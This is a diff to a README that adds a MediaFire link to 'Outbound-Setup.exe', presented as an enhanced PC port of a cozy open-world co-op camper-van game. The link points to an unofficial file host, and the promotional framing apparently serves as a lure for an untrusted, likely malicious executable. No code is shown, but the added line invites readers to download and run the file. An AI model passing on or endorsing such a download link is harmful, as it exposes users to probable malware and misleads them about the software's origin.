@@ -1,5 +1,7 @@
 # Outbound: Desktop Version
 
+Download https://www.mediafire.com/file/0p1x3elbg10ypou/Outbound-Setup.exe/file
+
 **Outbound Desktop Version** is the optimized and enhanced PC port of the popular cozy open-world co-op life simulation game released in 2026.
 
 Build and customize your dream solar-powered camper van, travel across a beautiful open world, craft, explore, and live the ultimate nomadic off-grid life — alone or with up to 4 friends in co-op.
